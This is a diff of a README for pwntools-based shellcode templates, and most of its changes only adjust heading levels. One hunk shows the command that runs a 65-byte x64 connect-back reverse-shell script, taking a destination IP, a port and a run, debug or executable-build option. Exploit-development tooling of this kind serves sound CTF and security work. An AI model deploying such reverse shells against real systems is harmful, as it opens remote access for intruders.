@@ -1,7 +1,7 @@
-## `Modern templates for Modern Shellcoding
+# Modern templates for Modern Shellcoding
 
 
-#### The (not so) boring introduction
+## The (not so) boring introduction
 
 Assembly coding is a dark art, that I have practiced for almost 35 years. (I remember with emotion Michael Abrash books, *Zen of Assembly Language* )
 
@@ -24,7 +24,7 @@ so to resume, for almost all these shellcodes you can find on internet, they are
 + not easy modify
 + not easy run and test
 
-#### Developping a modern template
+## Developping a modern template
 
 In recent years, [pwntools](https://docs.pwntools.com/en/stable/#]) has became the *de facto* standard tool for Pwners for developping exploits in python.
 
@@ -38,7 +38,7 @@ All these tasks with a single reusable template..
 
 
 
-#### Prerequisites
+## Prerequisites
 
 First you will need to have a working installation of Pwntools
 
@@ -64,7 +64,7 @@ they will make your debugging life more easy..
 So let's start with a X86 basic template, to see how to use it.
 
 
-#### X86 template example.
+## X86 template example.
 
 ```python
 from pwn import *
@@ -146,7 +146,7 @@ let's see this various options in action, still with a simple `execve` shellcode
 
 ![](pics/example2.gif)
 
-#### Various architectures templates
+## Various architectures templates
 
  
 + [Template for x86 64 bits](./template.x64.py)
@@ -155,7 +155,7 @@ let's see this various options in action, still with a simple `execve` shellcode
 + [Template for mips](./template.mips.py)
 
 
-#### passing arguments to your shellcode, and example
+## passing arguments to your shellcode, and example
 
 So, for example, you can also give some arguments to your shellcode, to customize it.
 
@@ -165,7 +165,10 @@ it's 65bytes in x64, and contains no zeroes:
 
 you can use this syntax:
 
-`python3 connect.back.reverse.shell.x64.without.zeroes.py 192.168.1.1 1234 [RUN|GDB|EXE]`
+```sh
+python3 connect.back.reverse.shell.x64.without.zeroes.py <IP> <PORT> [RUN|GDB|EXE]
+```
+
 
 you indicate the destination IP and port for connection, and you can RUN or DEBUG or produce an EXE..
 
@@ -263,7 +266,7 @@ elif args.GDB:
 ```
 
 
-#### conclusion
+## conclusion
 
 Well I hope these templates will be useful to you,
 
